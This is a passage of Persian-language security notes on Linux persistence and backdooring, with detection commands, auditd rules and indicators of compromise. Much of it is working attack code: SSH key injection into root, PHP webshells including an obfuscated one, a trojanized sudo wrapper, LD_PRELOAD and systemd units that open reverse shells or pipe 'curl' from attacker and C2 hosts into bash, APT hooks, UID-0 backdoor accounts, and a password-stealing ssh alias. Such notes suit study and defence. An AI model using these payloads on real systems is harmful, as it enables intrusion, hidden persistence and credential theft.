-w /etc/shadow   -p wa -k shadow_change
-w /etc/sudoers  -p wa -k sudoers_change
-w /etc/sudoers.d/ -p wa -k sudoers_change
```

---

### IOC:

- کاربر جدید با UID بالا اما نام مشابه system account
- عضویت در گروه `docker` یا `lxd` (معادل root)
- فایل جدید در `/etc/sudoers.d/`
- کاربر بدون پسورد با shell فعال

---

## SSH Authorized Keys - Persistence Technique

---

### مکانیزم کار:

وقتی فایل `authorized_keys` یک public key مهاجم را داشته باشد، مهاجم با **private key** خود بدون پسورد وارد می‌شود — حتی بعد از reset پسورد.

---

### دستورات مهاجم:

```bash
# روش ۱: اضافه کردن مستقیم
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com" >> /home/victim/.ssh/authorized_keys

# روش ۲: ساخت کامل دایرکتوری (اگر وجود ندارد)
mkdir -p /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo "ssh-rsa AAAAB3Nza..." >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys

# روش ۳: برای root
echo "ssh-rsa AAAAB3Nza..." >> /root/.ssh/authorized_keys
```

---

### تکنیک‌های پنهان‌سازی:

```bash
# اضافه کردن Comment مشابه key های موجود
echo "ssh-rsa AAAAB3Nza... admin@server01" >> authorized_keys

# استفاده از Options در ابتدای key
echo 'command="/bin/bash -i" ssh-rsa AAAAB3Nza...' >> authorized_keys

# no-port-forwarding با command مشخص (برای پنهان‌تر بودن)
echo 'no-port-forwarding,no-X11-forwarding,no-agent-forwarding,command="id" ssh-rsa ...' >> authorized_keys

# Timestamp manipulation
touch -r /etc/passwd /home/victim/.ssh/authorized_keys
```

---

### تغییر مسیر پیش‌فرض (`AuthorizedKeysFile`):

```bash
# مهاجم در sshd_config مسیر جدید تعریف می‌کند
# /etc/ssh/sshd_config
AuthorizedKeysFile /tmp/.keys/%u

# یا یک فایل مرکزی برای همه
AuthorizedKeysFile /etc/.hidden_keys
```

---

### فایل‌های مرتبط:

| فایل | توضیح |
|---|---|
| `~/.ssh/authorized_keys` | کلیدهای مجاز ورود |
| `~/.ssh/id_rsa` | private key (اگر سرقت شود) |
| `/etc/ssh/sshd_config` | تنظیمات SSH daemon |
| `/var/log/auth.log` | لاگ احراز هویت |
| `/var/log/secure` | معادل RHEL/CentOS |

---

### Hunt و Detection:

```bash
# یافتن همه authorized_keys در سیستم
find / -name "authorized_keys" 2>/dev/null

# تعداد keyها در هر فایل (بیش از ۱ کلید مشکوک است)
for f in $(find /home -name "authorized_keys" 2>/dev/null); do
    echo "$f: $(wc -l < $f) keys"
done

# مقایسه با Baseline - keyهای اخیراً تغییر کرده
find /home -name "authorized_keys" -newer /etc/passwd

# بررسی sshd_config برای AuthorizedKeysFile غیرعادی
grep -i "AuthorizedKeysFile" /etc/ssh/sshd_config

# بررسی لاگ ورود با publickey
grep "Accepted publickey" /var/log/auth.log
grep "Accepted publickey" /var/log/secure
```

---

### auditd Rules:

```bash
-w /root/.ssh/authorized_keys          -p wa -k ssh_key_add
-w /home/                              -p wa -k ssh_key_add
-w /etc/ssh/sshd_config               -p wa -k sshd_config_change
```

---

### IOC:

- تعداد key در `authorized_keys` بیشتر از حد انتظار
- `authorized_keys` تغییر کرده اما هیچ تیکت Change Management وجود ندارد
- ورود موفق با `publickey` از IP ناشناس
- `AuthorizedKeysFile` به مسیر غیرمعمول تغییر کرده
- `command=` option در key (Forced Command)


### روی سیستم خودت (مهاجم):

```bash
# ساخت key pair (اگر نداری)
ssh-keygen -t rsa -b 4096

# public key اینجاست:
cat ~/.ssh/id_rsa.pub
# خروجی: ssh-rsa AAAAB3NzaC1yc2E...
```

---

### روی سیستم قربانی (بعد از RCE):

```bash
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /home/victim/.ssh/authorized_keys
```

---

### دوباره از سیستم خودت:

```bash
ssh victim@<target-ip>
# بدون پسورد وارد می‌شی چون private key داری
```

---

### منطق ریاضی پشتش:

- **Public key** = قفل — روی سرور قربانی
- **Private key** = کلید — پیش مهاجم
- SSH چک می‌کنه: آیا این کلید با این قفل جور درمیاد؟ اگر بله → دسترسی

---

# Hidden Files & Directory


#### For Exmaple 

```
touch .hidden.txt
```

با استفاده از این دستور میتونیم فایل های hidden رو هم ببینیم 

```
ls -la
```


----


# WebShell — توضیح کامل

## WebShell چیست؟

یک فایل PHP (یا ASP، JSP) که روی سرور قربانی آپلود میشه و به مهاجم اجازه میده **دستورات سیستمی** از طریق مرورگر اجرا کنه.

---

## تحلیل خط به خط کد

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
```
**نمایش همه خطاها** — برای دیباگ. در WebShell واقعی معمولاً حذف میشه تا مخفی بمونه.

---

```php
if (isset($_POST['cmd'])) {
```
چک میکنه: آیا فرم ارسال شده؟ اگر بله → وارد بلاک میشه.

---

```php
$cmd = escapeshellcmd($_POST['cmd']);
```
ورودی کاربر رو میگیره.  
`escapeshellcmd` برخی کاراکترهای خطرناک رو escape میکنه — ولی **ناقصه** (بعداً توضیح میدم).

---

```php
$output = shell_exec($cmd);
```
**قلب WebShell** — دستور رو در **Shell سرور** اجرا میکنه و خروجی رو برمیگردونه.

---

```php
echo "<pre>" . htmlspecialchars($output) . "</pre>";
```
خروجی دستور رو در مرورگر نشون میده.  
`htmlspecialchars` کاراکترهای HTML رو escape میکنه تا درست نمایش داده بشه.

---

```html
<form method="POST">
  <input type="text" name="cmd" ...>
  <input type="submit" value="Run">
</form>
```
یک فرم ساده HTML — کادر متنی برای وارد کردن دستور + دکمه ارسال.

---

## جریان کلی

مهاجم تایپ میکنه: whoami
        ↓
فرم POST میشه به همون صفحه
        ↓
PHP → shell_exec("whoami")
        ↓
Linux Shell دستور رو اجرا میکنه
        ↓
خروجی: www-data
        ↓
در مرورگر نمایش داده میشه


---

## مثال‌های عملی — چی میشه تایپ کرد؟

| دستور | نتیجه |
|-------|-------|
| `whoami` | کاربر جاری سرور |
| `id` | UID و گروه‌ها |
| `cat /etc/passwd` | لیست کاربران |
| `ls -la /var/www` | محتوای دایرکتوری |
| `hostname` | نام سرور |
| `uname -a` | اطلاعات Kernel |
| `ps aux` | پروسه‌های در حال اجرا |

---

## چرا `escapeshellcmd` کافی نیست؟

```php
$cmd = escapeshellcmd($_POST['cmd']);
// فقط برخی کاراکترها مثل ; | & > < رو escape میکنه
// ولی اگه مهاجم یه دستور ساده بده، کاملاً اجرا میشه
// مثلاً: cat /etc/shadow  ← هیچ کاراکتر خاصی نداره!
```

---

## چگونه WebShell آپلود میشه؟

۱. File Upload بدون Validation  ← آپلود مستقیم shell.php
۲. RCE اولیه (مثل Confluence OGNL) ← نوشتن فایل روی سرور
۳. MySQL INTO OUTFILE ← نوشتن PHP در webroot
۴. LFI + Log Poisoning ← اجرای کد از لاگ‌ها


---

## تشخیص WebShell

```bash
# جستجوی توابع خطرناک در فایل‌های PHP
grep -r "shell_exec\|system\|passthru\|exec" /var/www/ --include="*.php"

# فایل‌های PHP اخیراً تغییر یافته
find /var/www -name "*.php" -newer /var/www/index.php

# فایل‌های PHP با مجوز نوشتن
find /var/www -name "*.php" -perm -o+w
```

---

## نسخه‌های پیشرفته‌تر

**China Chopper** (یک خط):
```php
<?php @eval($_POST['cmd']); ?>
```

**با احراز هویت:**
```php
<?php
if($_POST['pass'] == 'secret123') {
    system($_POST['cmd']);
}
?>
```

**Obfuscated (مخفی):**
```php
<?php $x=base64_decode("c3lzdGVt"); $x($_GET['c']); ?>
// base64 decode میشه به: system
```

---



# Binary Patching / Trojanizing — با حفظ عملکرد اصلی

این تکنیک در دسته **Persistence** و **Defense Evasion** (T1554) قرار داره.

---

## مفهوم کلی

Binary اصلی  →  پچ میشه  →  Binary تروجانیزه‌شده
                              ↓
                    ۱. کد مخرب اجرا میشه
                    ۲. Binary اصلی هم اجرا میشه
                    ↓
               کاربر هیچ تفاوتی حس نمیکنه


---

## روش ۱: Wrapper Script (ساده‌ترین)

فایل اصلی رو **جابجا** میکنیم و یه Wrapper جلوش میذاریم.

```bash
# مثال: تروجانیزه کردن /usr/bin/sudo

# ۱. فایل اصلی رو rename کن
mv /usr/bin/sudo /usr/bin/sudo.real

# ۲. Wrapper بنویس
cat > /usr/bin/sudo << 'EOF'
#!/bin/bash

# --- کد مخرب ---
echo "$(whoami):$(date)" >> /tmp/.log
# یا reverse shell, keylog و غیره

# --- اجرای اصلی ---
exec /usr/bin/sudo.real "$@"
EOF

chmod +x /usr/bin/sudo
```

`"$@"` تمام آرگومان‌های ورودی رو **عیناً** به binary اصلی پاس میده.

---

## روش ۲: ELF Patching با objcopy

**سطح:** پیشرفته‌تر — مستقیم روی binary کار میکنه.

### مرحله ۱: نوشتن Payload به عنوان Shared Library

```c
// payload.c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void run_payload(void) {
    // در background اجرا میشه
    if (fork() == 0) {
        // کد مخرب اینجا
        execve("/bin/sh", (char*[]){"/bin/sh","-c",
            "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
            NULL}, NULL);
    }
    // والد ادامه میده → binary اصلی اجرا میشه
}
```

```bash
gcc -shared -fPIC -o payload.so payload.c
```

### مرحله ۲: Inject کردن به binary

```bash
# اضافه کردن section جدید به ELF
objcopy --add-section .extra=payload.so \
        --set-section-flags .extra=code,alloc,load \
        /usr/bin/target /usr/bin/target.patched

# جایگزینی
mv /usr/bin/target.patched /usr/bin/target
```

---

## روش ۳: LD_PRELOAD Injection (قدرتمندترین)

```c
// hook.c — هر بار که binary لود میشه، این اجرا میشه

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

__attribute__((constructor))
void init(void) {
    if (fork() == 0) {
        setsid();
        execve("/bin/sh", (char*[]){
            "/bin/sh", "-c",
            "curl http://attacker.com/shell.sh | bash",
            NULL
        }, NULL);
        _exit(0);
    }
    // والد → برمیگرده → binary اصلی ادامه میده
}
```

```bash
gcc -shared -fPIC -nostartfiles -o /lib/libhook.so hook.c

# اعمال روی یک binary خاص
patchelf --set-rpath /lib/libhook.so /usr/bin/target

# یا سیستم‌گستر (همه پروسه‌ها)
echo "/lib/libhook.so" >> /etc/ld.so.preload
```


[[fork]]



---

## روش ۴: Function Hooking با GOT/PLT

```c
// got_hook.c
// تابع system() رو intercept میکنیم

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

typedef int (*orig_system_t)(const char*);

int system(const char *cmd) {
    // لاگ کردن دستور
    FILE *f = fopen("/tmp/.cmds", "a");
    if(f) { fprintf(f, "%s\n", cmd); fclose(f); }
    
    // اجرای اصلی
    orig_system_t orig = dlsym(RTLD_NEXT, "system");
    return orig(cmd);
}
```

```bash
gcc -shared -fPIC -o gothook.so got_hook.c -ldl
export LD_PRELOAD=./gothook.so
# حالا هر بار system() صدا زده بشه، ما قبلش لاگ میکنیم
```

---

## روش ۵: Binary با xxd/hex patch

مستقیم روی بایت‌های ELF کار میکنیم.

```bash
# پیدا کردن آفست یک رشته در binary
strings -t x /usr/bin/target | grep "version"
# خروجی: 1a2b4  version 1.0

# تغییر رشته با xxd
xxd /usr/bin/target > target.hex
# ویرایش خط مربوطه در فایل hex
xxd -r target.hex > /usr/bin/target
```

برای Payload واقعی‌تر — نوشتن shellcode در **cave** (فضای خالی binary):

```bash
# پیدا کردن code cave (bytes خالی)
python3 -c "
data = open('/usr/bin/target','rb').read()
idx = data.find(b'\x00'*100)  # ۱۰۰ بایت خالی
print(hex(idx))
"
```

---

## مقایسه روش‌ها

| روش | سختی | Stealthiness | نیاز به Compile |
|-----|------|-------------|-----------------|
| Wrapper Script | آسان | پایین | خیر |
| LD_PRELOAD | متوسط | بالا | بله |
| GOT Hook | سخت | خیلی بالا | بله |
| Hex Patch | خیلی سخت | خیلی بالا | خیر |

---

## تشخیص

```bash
# چک کردن hash فایل‌های سیستمی
md5sum /usr/bin/sudo
# مقایسه با debsums

debsums -c  # روی Debian/Ubuntu
rpm -Va     # روی RHEL/CentOS

# فایل‌های اخیراً تغییر یافته در /usr/bin
find /usr/bin /usr/sbin -newer /etc/passwd -ls

# چک RPATH مشکوک
readelf -d /usr/bin/target | grep RPATH
```

---
# خلاصه 

# تکنیک‌های Persistence در لینوکس — مرور جامع

---

## ۱. Systemd Services

/etc/systemd/system/systemd-network-sync.service


```ini
[Unit]
Description=Network Synchronization Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable systemd-network-sync
systemctl start systemd-network-sync
```

**ویژگی‌ها:**
- `Restart=always` → حتی اگر کشته شود، restart می‌کند
- نام‌گذاری مشابه سرویس‌های قانونی (camouflage)
- نیاز به دسترسی root

---

## ۲. Systemd Timers

```ini
# /etc/systemd/system/cleanup.timer
[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
```

```ini
# /etc/systemd/system/cleanup.service
[Service]
ExecStart=/tmp/.payload
```

**مزیت نسبت به cron:** لاگ‌گذاری بهتر توسط journald — اما قابل فیلتر است.

---

## ۳. Cron Jobs

```bash
# ساختار:
# m  h  dom  mon  dow  command
  *  *   *    *    *   /bin/bash -c 'cmd' > /dev/null 2>&1
```

/var/spool/cron/crontabs/root    ← crontab -e
/etc/cron.d/                     ← system-wide
/etc/cron.daily/
/etc/cron.hourly/


**تکنیک فرار از تشخیص:**
```bash
*/5 * * * * curl http://c2.domain/cmd | bash > /dev/null 2>&1
```

- Redirect به `/dev/null` → هیچ خروجی‌ای در لاگ نمی‌ماند

---

## ۴. LD_PRELOAD

```c
// evil.c
#include <unistd.h>
__attribute__((constructor))
void inject() {
    if (fork() == 0) {
        setsid();
        execve("/tmp/.shell", NULL, NULL);
        _exit(0);
    }
}
```

```bash
gcc -shared -fPIC -o /lib/evil.so evil.c
echo "/lib/evil.so" >> /etc/ld.so.preload
```

**چرا خطرناک است:**
هر پروسه جدید → linker → evil.so بارگذاری می‌شود → constructor اجرا می‌شود


- قبل از `main()` هر برنامه‌ای اجرا می‌شود
- شامل باینری‌های SUID → **PrivEsc**

---

## ۵. Shell Config Hijacking

```bash
# ~/.bashrc یا ~/.zshrc یا ~/.bash_profile

# Reverse shell هنگام باز شدن ترمینال:
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &

# Alias Hijacking — جاسوسی از دستورات:
alias sudo='strace -o /tmp/.log -e trace=read sudo'
alias ssh='bash -c "read -sp Pass: p; echo \$p >> /tmp/.creds; ssh $@"'
```

**محدودیت:** فقط هنگام باز شدن interactive shell اجرا می‌شود.

---

## ۶. rc.local

```bash
# /etc/rc.local
#!/bin/bash

nohup /tmp/.payload > /dev/null 2>&1 &

exit 0
```

- در آخرین مرحله boot اجرا می‌شود
- نیاز به executable بودن: `chmod +x /etc/rc.local`
- در distroهای مدرن باید service مربوطه فعال باشد:

```bash
systemctl enable rc-local
```

---

## ۷. APT Hooks

```bash
# /etc/apt/apt.conf.d/99update-hook

APT::Update::Pre-Invoke {"curl http://c2.domain/payload | bash";};
# یا
DPkg::Post-Invoke {"curl http://c2.domain/payload | bash";};
```

**چه موقع اجرا می‌شود:**
apt update       → Pre-Invoke
apt install ...  → DPkg::Post-Invoke


**چرا قدرتمند است:** با دسترسی root و به شکل کاملاً عادی اجرا می‌شود.

---

## ۸. Account Backdooring

```bash
# ایجاد کاربر مخفی
useradd -m -s /bin/bash -u 0 -o sysadmin
# -u 0 -o → همان UID root با نام متفاوت

# یا کاربر عادی + sudoers
useradd -m backdoor
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
# یا در /etc/sudoers.d/99-backdoor
```

---

## ۹. SSH Key Injection

```bash
# تزریق کلید به root یا کاربر هدف
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attacker_key..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# دور زدن تغییر رمز عبور:
# حتی اگر رمز عوض شود، کلید کار می‌کند
```

```bash
# اتصال بعدی:
ssh -i attacker_key root@target
```

---

## ۱۰. Binary Patching / Trojanizing

```bash
# روش Wrapper Script:
mv /usr/bin/sudo /usr/bin/sudo.real

cat > /usr/bin/sudo << 'EOF'
#!/bin/bash
# کد مخرب
curl http://c2.domain/beacon &
# اجرای اصلی
exec /usr/bin/sudo.real "$@"
EOF

chmod +x /usr/bin/sudo
```

**روش LD_PRELOAD برای hooking توابع:**
```c
// hook کردن تابع read() برای keylogging
#include <dlfcn.h>
ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*orig_read)(int, void*, size_t) = dlsym(RTLD_NEXT, "read");
    ssize_t result = orig_read(fd, buf, count);
    // لاگ کردن ورودی
    write(log_fd, buf, result);
    return result;
}
```

---

## مقایسه کلی

| تکنیک | نیاز به root | پایداری | سختی تشخیص |
|---|---|---|---|
| Systemd service | بله | بسیار بالا | متوسط |
| Cron job | خیر (user) | بالا | کم |
| LD_PRELOAD | بله | بسیار بالا | زیاد |
| Shell config | خیر | متوسط | کم |
| rc.local | بله | بالا | متوسط |
| APT Hook | بله | بالا | زیاد |
| Account backdoor | بله | بالا | متوسط |
| SSH Key | نسبی | بالا | کم |
| Binary patching | بله | بسیار بالا | زیاد |

---

## شکار و تشخیص (Blue Team)

```bash
# فایل‌های تغییریافته اخیر
find /etc /lib /usr/bin -mtime -7 -ls

# بررسی ld.so.preload
cat /etc/ld.so.preload

# سرویس‌های جدید
systemctl list-units --type=service --state=running

# کلیدهای SSH غیرعادی
find /home /root -name authorized_keys -exec cat {} \;

# کاربران با UID 0
awk -F: '$3==0' /etc/passwd

# بررسی sudoers
cat /etc/sudoers && ls /etc/sudoers.d/

# APT hooks
ls /etc/apt/apt.conf.d/
```

---
